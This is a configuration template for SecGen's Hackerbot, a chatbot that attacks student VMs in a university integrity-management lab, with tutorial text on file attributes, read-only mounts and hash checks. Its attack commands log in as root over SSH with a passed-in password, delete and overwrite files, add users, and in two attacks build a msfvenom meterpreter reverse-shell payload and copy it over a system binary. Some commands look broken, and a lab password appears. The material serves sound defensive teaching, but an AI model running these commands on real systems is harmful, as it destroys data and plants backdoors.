<%
  require 'json'
  require 'securerandom'
  require 'digest/sha1'
  require 'fileutils'

  if self.accounts.empty?
    abort('Sorry, you need to provide an account')
  end

  $first_account = JSON.parse(self.accounts.first).first
  $files = []
  $log_files = []
  if $first_account.key?("leaked_filenames") &&  $first_account['leaked_filenames'].size > 0
    $files = $first_account['leaked_filenames']
    $log_files = $first_account['leaked_filenames'].grep(/log/)
  end

  if $files.empty?
    $files = ['myfile', 'afile', 'filee', 'thefile']
  end
  if $log_files.empty?
    $log_files = ['log', 'thelog', 'logs', 'frogonalog']
  end

  $main_user = $first_account['username'].to_s

  $root_password = self.root_password
  $flags = self.flags

  REQUIRED_FLAGS = 17
  while $flags.length < REQUIRED_FLAGS
    $flags << "flag{#{SecureRandom.hex}}"
    Print.err "Warning: Not enough flags provided to hackerbot_config generator, some flags won't be tracked/marked!"
  end

%>
<?xml version="1.0"?>

<hackerbot
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xsi:schemaLocation="http://www.github/cliffe/SecGen/hackerbot">
<!--<hackerbot xmlns="http://www.github/cliffe/SecGen/hackerbotz"-->

	<name>Hackerbot</name>

	<AIML_chatbot_rules>config/AIML</AIML_chatbot_rules>

	<!--Method for gaining shell access, can be overwritten per-attack-->
	<!--<get_shell>bash</get_shell>-->
	<get_shell>sshpass -p <%= $root_password %> ssh -oStrictHostKeyChecking=no root@{{chat_ip_address}} /bin/bash</get_shell>

	<messages>
		<greeting>Your system is about to be hacked. I'll do what I can hold them off, but you are going to have to work with me to protect yourself. I'll cough up some flags if you work with me.</greeting>

		<!--Must provide alternatives for each message-->
		<say_ready>Let me know when you are 'ready', if you want to move on to another attack, say 'next', or 'previous' and I'll move things along</say_ready>
		<say_ready>When you are ready, simply say 'ready'.</say_ready>
		<say_ready>'Ready'?</say_ready>
		<say_ready>Better hurry, the attack is imminent... Let me know when you're 'ready'.</say_ready>
		<next>Ok, I'll do what I can to move things along...</next>
		<next>Moving things along to the next attack...</next>
		<next>Ok, next attack...</next>
		<previous>Ok, I'll do what I can to back things up...</previous>
		<previous>Ok, previous attack...</previous>
		<previous>Ok, backing up.</previous>
		<goto>Ok, skiping it along.</goto>
		<goto>Let me see what I can do to goto that attack.</goto>
		<last_attack>That was the last attack for now. You can rest easy, until next time... (End.)</last_attack>
		<last_attack>That was the last attack. Game over?</last_attack>
		<first_attack>You are back to the beginning!</first_attack>
		<first_attack>This is where it all began.</first_attack>
		<getting_shell>Ok. Gaining shell access, and running post command...</getting_shell>
		<getting_shell>Hacking in progress...</getting_shell>
		<getting_shell>Attack underway...</getting_shell>
		<getting_shell>Here we go...</getting_shell>
		<got_shell>We are in to your system.</got_shell>
		<got_shell>You are pwned.</got_shell>
		<got_shell>We have shell.</got_shell>
		<repeat>Let me know when you are 'ready', if you want to move on to another attack, say 'next', or 'previous' and I'll move things along</repeat>
		<repeat>Say 'ready', 'next', or 'previous'.</repeat>

		<!--Single responses:-->
		<help>I am waiting for you to say 'ready', 'next', 'previous', 'list', 'goto *X*', or 'answer *X*'</help>
		<say_answer>Say "The answer is *X*".</say_answer>
		<no_quiz>There is no question to answer</no_quiz>
		<correct_answer>Correct</correct_answer>
		<incorrect_answer>Incorrect</incorrect_answer>
		<invalid>That's not possible.</invalid>
		<non_answer>Wouldn't you like to know.</non_answer>

		<!--can be overwritten per-attack-->
		<shell_fail_message>Oh no. Failed to get shell... You need to let us in.</shell_fail_message>
	</messages>

	<tutorial_info>
		<title>Integrity Management: Protecting Against and Detecting Change</title>
		<tutorial>
# Integrity Management: Protecting Against and Detecting Change

## For marks in the module:
1. **You need to submit flags**. Note that the flags and the challenges in your VMs are different to other's in the class. Flags will be revealed to you as you complete challenges throughout the module.
Flags look like this:
> flag{somethingrandom}
2. **You need to document the work and your solutions in a workbook**. This needs to include screenshots (including the flags) of how you solved each challenge and a writeup describing your solution to each challenge, and answering "Questions". The workbook will be submitted later in the semester.

## Integrity

Security is often described in terms of confidentiality, integrity, and availability. Protecting the integrity of information involves preventing and detecting unauthorised changes. In many commercial organisations integrity of information is the highest priority security goal. Managing who is authorised to make changes to databases or files, and monitoring the integrity of resources for unauthorised changes is an important task in managing information security.

## Protecting integrity

Protecting the integrity of resources, such as the files on a system, involves successfully managing a variety of security mechanisms, such as authentication, access controls and file permissions, firewalls, and so on.

> On Linux systems this can include managing passwords, packet filtering IPTables rules, standard Unix file permissions (rwx), Linux extended attributes (including ACLs for detailed authentication, labels for mandatory access control (MAC), and Linux Capabilities). Linux (like other Unix-like and Unix-based systems) has a long history of adding new security features as and when they are required.
>
> Note that many security controls such as those listed above are very important for protecting the integrity of files, but are beyond the scope of this lab. Here the focus is on techniques that are *entirely* focussed on integrity rather than confidentiality or availability.

There are precautions that can be taken to reduce the chances of unauthorised changes.

## Getting started

###### Action:
Start the VMs:
- hackerbot_server (leave it running, you don't log into this)
- desktop (login with username: dropbear, password: tisapbiqe2r)

## Meet Hackerbot!
This exercise involves interacting with Hackerbot, a chatbot who will attack your system. If you satisfy Hackerbot by completing the challenges she will reveal flags to you.

###### On the desktop VM:
###### Action:
Open Pidgin and send a message to Hackerbot.

Try asking Hackerbot some questions.

###### Action:
Send "hello"

Hackerbot will start you on your journey!

Send "help"

Send "list"

		</tutorial>
		<footer>
## License
This lab by [*Z. Cliffe Schreuders*](http://z.cliffe.schreuders.org) at Leeds Beckett University is licensed under a [*Creative Commons Attribution-ShareAlike 3.0 Unported License*](http://creativecommons.org/licenses/by-sa/3.0/deed.en_GB).

Generated by SecGen (<%= Time.new.to_s %>)
		</footer>


		<provide_tutorial>true</provide_tutorial>


	</tutorial_info>

	<attack>
<% $file = $files.sample -%>
		<prompt>An attempt to delete /home/<%= $main_user %>/<%= $file %> is coming. Stop the attack using access controls.</prompt>

		<post_command>rm --interactive=never /home/<%= $main_user %>/<%= $file %>; echo $?</post_command>
		<condition>
			<output_matches>Permission denied</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack>true</trigger_next_attack>
		</condition>
		<condition>
			<output_equals>0</output_equals>
			<message>:( We managed to delete your file! You need to use access controls to protect the file. Create a new file.</message>
		</condition>
		<condition>
			<output_matches>No such file or directory</output_matches>
			<message>:( The file <%= $file %> should exist!</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<tutorial>
### Protecting integrity with file permissions
#### Getting to know file permissions
Open a terminal console (such as Konsole from KDEMenu → Applications → System → Konsole).

Start by creating a file with some content. Run:

```bash
sudo bash -c 'cat > /var/log/mylogfile'
```
> (Type some content, then press Ctrl-D to finish and return to the
prompt.)

Look at the details of the file:

```bash
ls -la /var/log/mylogfile
```
``
 -rw-r--r-- 1 root root 20 Feb 7 17:38 /var/log/mylogfile
``

As we can see above, the file is owned by root, who has read-write access.

Exploring Unix file permissions further is outside the scope of this lab, but will be covered elsewhere.
		</tutorial>
	</attack>

	<attack>
<% $log_file = $log_files.sample -%>
		<!--<topic>Protecting integrity with file attributes</topic>-->
		<prompt>An attempt to delete /home/<%= $main_user %>/<%= $log_file %> is coming. Stop the attack using file attributes.</prompt>

		<post_command>rm --interactive=never /home/<%= $main_user %>/<%= $log_file %>; echo $?</post_command>
		<condition>
			<output_matches>Operation not permitted</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack>true</trigger_next_attack>
		</condition>
		<condition> <!-- TODO: chmod to defeat the defense? -->
			<output_matches>Permission denied</output_matches>
			<message>:( You did protect the file, but not using file attributes.</message>
		</condition>
		<condition>
			<output_equals>0</output_equals>
			<message>:( We managed to delete your file! You need to use file attributes to protect the file.  Create a new file.</message>
		</condition>
		<condition>
			<output_matches>No such file or directory</output_matches>
			<message>:( The file should exist!</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<tutorial>
### Protecting integrity with file attributes
#### Getting to know file attributes
Unix systems (such as Linux or FreeBSD) include file attributes that, amongst other features, can make files immutable or append only. Setting these file attributes can provide an effective layer of security, and yet could be considered one of the more obscure Unix security features[^1]. Note that this feature is dependent on the use of a compatible filesystem (most Unix filesystems, such as ext, are compatible with file attributes). Once configured, file attributes can even prevent root (the all-powerful Unix superuser) from making changes to certain files.

[^1]: Setting a file to immutable (and therefore impossible to simply delete) can be an effective prank against the uninitiated in Unix ways.

Run:
```bash
lsattr /var/log/mylogfile
```
``
 -------------e- /var/log/mylogfile
``

The ‘e’ flag is common on ext filesystems, may or may not be present when you run the above, and does not really concern us. From a security perspective the ‘a’ and ‘i’ flags are the most interesting. Read the man page for chattr to find out more about these flags and what they do:

```bash
man chattr
```
> (Press q to leave the manual page)

Set the ‘i’ flag using the chattr command:
```bash
sudo chattr +i /var/log/mylogfile
```

Now try to delete the file and see what happens:
```bash
rm /var/log/mylogfile
```
Denied! Opps, that’s right, root owns the file (since you created it with sudo)! Use root to try to delete the file:
```bash
sudo rm /var/log/mylogfile
```

It still didn’t work! That’s right, even root can’t delete the file, without changing the file’s attributes back first.

Use some commands to remove the ‘i’ flag (hint: “-i”, instead of “+i”).

Now run a command to set the ‘a’ flag on /var/log/mylogfile.

If you have done so correctly, attempting to overwrite the file with a test message should fail:
```bash
sudo bash -c 'echo "test message" > /var/log/mylogfile'
```
> This should produce an error, since ‘&gt;’ causes the output of the program to be written to the specified log file, which is not allowed due to the chattr command you have run.

Yet you should be able to append messages to the end of the file:

```bash
sudo bash -c 'echo "YOURNAME: test message" >> /var/log/mylogfile'
```
> This should succeed, since ‘&gt;&gt;’ causes the output of the program to be appended (added to the end of) to the specified log file, which is allowed. Use your name above, for example “echo "Cliffe: test message" &gt;&gt; /var/log/mylogfile”.

View your changes at the end of the file:

> tail /var/log/mylogfile

This has obvious security benefits, this feature can be used to allow files to be written to without altering existing content. For example, for ensuring that log files can be written to, but avoiding giving everyone who can write to the file the ability to alter its contents.
		</tutorial>
	</attack>

	<attack>
<% $log_file = $log_files.sample -%>
		<!--<topic>Protecting integrity with file attributes</topic>-->
		<prompt>An attempt to overwrite /home/<%= $main_user %>/<%= $log_file %> is coming. Stop the attack by making the file append only.</prompt>

		<post_command>echo 'your logs are gone!' > /home/<%= $main_user %>/<%= $log_file %>; echo 'damn!' >> /tmp/test/log1; tail /tmp/test/log1</post_command>
		<condition>
			<output_not_matches>damn!</output_not_matches>
			<message>:( You stopped anything from being appended to the file. What kind of log file do you think this is?</message>
		</condition>
		<condition>
			<output_matches>Operation not permitted</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack>true</trigger_next_attack>
		</condition>
		<condition>
			<output_matches>No such file or directory</output_matches>
			<message>:( The file should exist!</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>
		<tutorial>

		</tutorial>
	</attack>

	<attack>
		<!--<topic>Protecting integrity with read-only filesystems</topic>-->
		<prompt>An attempt to edit a file in /etc is coming. Stop the attack by bind mounting /etc/ as read-only.</prompt>

		<post_command>touch /etc/you_were_hacked; adduser yourehacked</post_command>
		<condition>
			<output_matches>Read-only file system</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted</output_matches>
			<message>:( You stopped the attack, but not by using read only bind mounting...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<tutorial>
### Protecting integrity with read-only filesystems
#### Getting to know read-only bind mounting
On Unix, a filesystem is mounted to a particular point in the directory structure; for example, a USB thumb drive may be mounted to /media/myUSB/. Some filesystems will automatically mount read-only; for example, if you insert a CD-ROM, since those disks are physically read-only. It is possible to optionally mount almost any filesystem, such as a USB or even a directory, in read-only mode, which will make it practically impossible to write changes to it (without remounting or accessing the drive/directory in other ways, which normally only root can do).

In a command prompt, run:
```bash
mount
```
> Note that many of the devices and directories have been mounted for read and write access (**rw**). For security reasons, it can be safer to mount things as read-only, when we don’t need to be able to make changes to the contents.

Ordinary users can only read the /etc directory but the superuser root who owns the /etc directory can read and write to it. In the following example, you are going to mount the /etc directory to a mount point (another directory within the filesystem) and the contents of the /etc directory will be accessible via the mount point.

List the contents of the /etc directory so you are familiar with its contents:
```bash
ls /etc
```
Create a new directory to be the mount point:
```bash
mkdir /home/<%= $main_user %>/test
```
Mount the /etc directory to the new mount point:
```bash
sudo mount -o bind /etc /home/<%= $main_user %>/test
```
Make sure the /etc directory is accessible via the test directory mount point:
```bash
ls /home/<%= $main_user %>/test
```
Ordinary users can only read but the superuser root can still write to the directory. Test this by creating a new file as the superuser root in the /home/student/test directory:
```bash
sudo touch /home/<%= $main_user %>/test/file1
```
Check that a new file has been created using the following commands
```bash
ls -l /home/<%= $main_user %>/test/file1
```
```bash
ls -l /etc/file1
```
We can use this techniques to make filesystems and directories read-only. In the next example you will remount the etc in read-only mode so that even the superuser root who owns the /etc directory cannot make changes to its contents via the mount point.
```bash
sudo mount -o remount,ro,bind /etc /home/<%= $main_user %>/test
```
Test this by trying creating a new file as the superuser root in the /home/<%= $main_user %>/test directory:
```bash
sudo touch /home/<%= $main_user %>/test/file2
```
This should prevent changes being accidently being made to important configuration files in the /etc directory.

Remount the the /etc directory as read-only to itself:
```bash
sudo mount -o remount,ro,bind /etc /etc
```
Mounting read-only can be an effective way of protecting resources that you don’t need to make any changes to. Read-only mounting is particularly effective when an actual disk resides externally, and can be enforced remotely. For example, when sharing files over the network.

> Note that mounting read-only may be circumvented by root (or a user with enough privilege) via direct access to the device files (/dev/sdc1 in the example above), or by re-mounting as read-write.

> Aside: in new versions of Linux, it is also possible to have a directory (one part of what is on a disk) present in the directory structure twice with different mount options (for example, /home/<%= $main_user %> and /home/<%= $main_user %>-read-only). This can be achieved by bind mounting, and then remounting to set the bind mount to read only. More information: [http://lwn.net/Articles/281157/](http://lwn.net/Articles/281157/)
		</tutorial>
	</attack>

	<attack>
<% $random_user = SecureRandom.hex -%>
		<!--<topic>Detecting changes to resources using backups</topic>-->
		<prompt>An attempt to add a new user is coming, let it happen. But first create a backup of /etc/passwd.</prompt>

		<post_command>sudo adduser hackerbot --gecos '<%= $random_user %>' --disabled-password --quiet; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>User added</message>
			<!--<trigger_next_attack>true</trigger_next_attack>-->
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>already exists</output_matches>
			<message>:( Remove the user and try again.</message>
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>Now after the attack, find the username added by diffing using a backup. What username was created?</question>
			<answer>^<%= $random_user %>$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<attack>
		<!--<topic>Detecting changes to resources using backups</topic>-->
		<prompt>An attempt to edit a config file is coming, let it happen. But first create a backup of the /etc/ directory to /tmp/etc-backup/.</prompt>

		<post_command>echo '# <%= $flags.pop %>' >> `find /etc/ -name '*.sh' | sort -R | head -n 1`; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>A flag has been inserted into a random file... Use your backups to compare /etc/ to the backup to find the flag. Get to work!</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>Find the flag, what file was the flag stored in?</question>
			<answer>^/etc/.*sh$</answer>
			<correct_answer_response>:) Well done</correct_answer_response>
			<trigger_next_attack />
		</quiz>

	</attack>

	<attack>
		<!--<topic>Detecting changes to resources using backups</topic>-->
		<prompt>An attempt to edit a config file is coming, let it happen.</prompt>

		<post_command>echo '# <%= $flags.pop %>' >> `find /tmp/etc-backup/ -name '*.sh' | sort -R | head -n 1`; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>A flag has been inserted into a random file IN YOUR BACKUPS! (Did you really think that was a safe place to store them?) Find the flag. Get to work!</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We are trying to write to /tmp/etc-backup/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /tmp/etc-backup/</message>
		</else_condition>

		<quiz>
			<question>Find the flag, what file was the flag stored in?</question>
			<answer>^/etc-backup/.*sh$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<attack>
<% $random = SecureRandom.hex -%>

		<!--<topic>File integrity checkers</topic>-->
		<prompt>Creating a new file in /home/<%= $main_user %>/...</prompt>

		<post_command>echo '<%= $random %>' > /home/<%= $main_user %>/something_secret; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>Created /home/<%= $main_user %>/something_secret</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the SHA1 hash of /home/<%= $main_user %>/something_secret?</question>
			<answer>^<%= Digest::SHA1.hexdigest ("#{$random + "\n"}") %>$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to edit one of your files in /etc/, use hash comparisons to detect which file changes</prompt>
		<post_command>x=`find /etc/ -name '*.sh' | sort -R | head -n 1`; echo '' >> $x; echo $x</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that changed?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to create a new file in /etc/, use hash comparisons to detect which new file changes (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>x=`find /etc/ -type d' | sort -R | head -n 1`; mktemp -p $x -t "XXXXXXXX"</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--TODO test this-->
	<!--TODO could further randomise outcomes, actually copies rather than creating a new binary-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to copy a new random binary in /bin/|/usr/bin/ use hash comparisons to find the filename of the copied file (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>srcf=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; dest=$srcf.$RANDOM; cp $srcf $dest; echo $dest</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--TODO test this-->
	<!--TODO could further randomise outcomes, actually copies rather than creating a new binary-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to move random binaries in /bin/|/usr/bin/ use hash comparisons to find the filename (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>mv1=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; mv2=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; mv $mv1 $mv1.tmp; mv $mv2 $mv1; mv $mv1.tmp $mv2; echo $mv1 $mv2</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--copied a new random file in /etc/ use hash comparisons to find the filename (hint: sha1deep, hashdeep, or shasum) -->
	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to copy a new random file in /etc/ use hash comparisons to find the filename (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>srcf=`find /etc/ -type f | sort -R | head -n 1`; cp $srcf $srcf.$RANDOM</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--trojanising a file in /usr/bin/, use hash comparisons to detect which file changes-->
	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<get_shell>binname=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; echo $binname; msfvenom -a -x86 --platform linux -p linux/x86/meterpreter_reverse_tcp --payload-options -f elf -o msfout; sshpass -p <%= $root_password %> scp -oStrictHostKeyChecking=no ./msfout root@{{chat_ip_address}}:$binname</get_shell>

		<prompt>Going to replace a binary file in /bin/ or /usr/bin/ with malware, detect which file has changed (hint: sha1deep, hashdeep, or shasum)</prompt>
		<!--<post_command></post_command>-->
		<!--<suppress_command_output_feedback />-->

		<!--<condition>-->
			<!--<output_matches>/etc.*</output_matches>-->
			<!--<message>Good. Now answer this...</message>-->
			<!--<trigger_quiz />-->
		<!--</condition>-->
		<!--<condition>-->
			<!--<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>-->
			<!--<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>-->
		<!--</condition>-->
		<!--<else_condition>-->
			<!--<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>-->
		<!--</else_condition>-->

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{shell_command_output_first_line}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--trojanising a file in /usr/bin/, use package management to detect which file changes-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<get_shell>binname=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; echo $binname; msfvenom -a -x86 --platform linux -p linux/x86/meterpreter_reverse_tcp --payload-options -f elf -o msfout; sshpass -p <%= $root_password %> scp -oStrictHostKeyChecking=no ./msfout root@{{chat_ip_address}}:$binname</get_shell>

		<prompt>Trojanising a file in /usr/bin/, use package management to detect which file changes</prompt>
		<!--<post_command></post_command>-->
		<!--<suppress_command_output_feedback />-->

		<!--<condition>-->
		<!--<output_matches>/etc.*</output_matches>-->
		<!--<message>Good. Now answer this...</message>-->
		<!--<trigger_quiz />-->
		<!--</condition>-->
		<!--<condition>-->
		<!--<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>-->
		<!--<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>-->
		<!--</condition>-->
		<!--<else_condition>-->
		<!--<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>-->
		<!--</else_condition>-->

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{shell_command_output_first_line}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>


</hackerbot>
